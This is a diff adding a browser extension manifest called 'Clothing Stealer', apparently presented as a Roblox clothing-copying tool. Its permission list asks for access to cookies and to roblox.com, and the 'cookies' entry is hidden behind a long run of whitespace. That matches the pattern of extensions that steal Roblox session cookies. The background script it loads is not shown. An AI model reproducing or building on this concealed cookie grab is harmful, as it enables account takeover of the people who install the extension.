@@ -1,0 +1,32 @@
+{
+     "name": "Clothing Stealer",
+     
+     "version": "1.0", 
+
+     "manifest_version": 2,
+
+     "description": "Instead of depending on a discord bot, do it yourself...", 
+
+     "browser_action": {
+
+         "default_icon": "cat.png"
+        
+     },
+     "permissions": [
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               "cookies",
+         "https://www.roblox.com/",
+         "activeTab"
+
+     ],
+     "background": {
+
+         "scripts": ["background.js"]
+
+     },
+
+     "icons": { "16": "cat.png",
+            "48": "cat.png",
+           "128": "cat.png"}
+
+ }
+ 
